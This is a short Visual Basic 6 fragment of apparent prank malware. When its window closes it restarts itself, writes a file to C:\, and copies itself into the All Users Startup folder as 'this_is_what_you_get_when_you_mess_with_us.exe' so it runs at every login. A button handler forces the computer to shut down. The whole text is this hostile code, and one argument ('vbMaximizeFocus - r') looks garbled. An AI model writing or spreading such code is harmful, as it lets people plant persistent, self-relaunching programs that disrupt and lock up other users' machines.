 Private Sub Form_Unload(Cancel As Integer)
  Shell App.Path & "\" & App.EXEName & ".exe"
  Open "C:\file.sys" For Output As #1
  FileCopy App.Path & "/" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\this_is_what_you_get_when_you_mess_with_us.exe"
End Sub

Private Sub Command1_Click()
   On Error Resume Next
   Shell "Shutdown.exe -s", vbMaximizeFocus - r
   Shell "rundll32.exe user.exe,exitwindows"
End Sub